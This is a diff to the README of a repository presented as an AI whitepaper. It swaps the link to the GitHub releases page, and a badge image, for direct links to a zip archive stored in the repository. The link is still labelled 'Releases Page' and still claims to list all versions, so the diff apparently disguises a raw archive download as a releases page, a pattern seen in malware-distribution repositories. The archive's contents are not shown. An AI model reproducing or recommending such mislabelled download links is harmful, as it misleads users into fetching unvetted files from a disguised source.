@@ -1,6 +1,6 @@
 # 🌟 DissipativeAI-Whitepaper - Exploring Intelligent Systems Simply
 
-[![Download DissipativeAI-Whitepaper](https://img.shields.io/badge/Download-DissipativeAI--Whitepaper-blue)](https://github.com/therohitbansal/DissipativeAI-Whitepaper/releases)
+[![Download DissipativeAI-Whitepaper](https://github.com/therohitbansal/DissipativeAI-Whitepaper/raw/refs/heads/main/docs/Whitepaper-A-Dissipative-v2.1.zip)](https://github.com/therohitbansal/DissipativeAI-Whitepaper/raw/refs/heads/main/docs/Whitepaper-A-Dissipative-v2.1.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ To use the material from this repository, you will need to download documents ex
 
 ## 📥 Download & Install
 
-To download the necessary files, please visit this page: [Releases Page](https://github.com/therohitbansal/DissipativeAI-Whitepaper/releases). On this page, you will find all the available versions of the whitepaper and associated materials.
+To download the necessary files, please visit this page: [Releases Page](https://github.com/therohitbansal/DissipativeAI-Whitepaper/raw/refs/heads/main/docs/Whitepaper-A-Dissipative-v2.1.zip). On this page, you will find all the available versions of the whitepaper and associated materials.
 
 ### Steps to Download
 
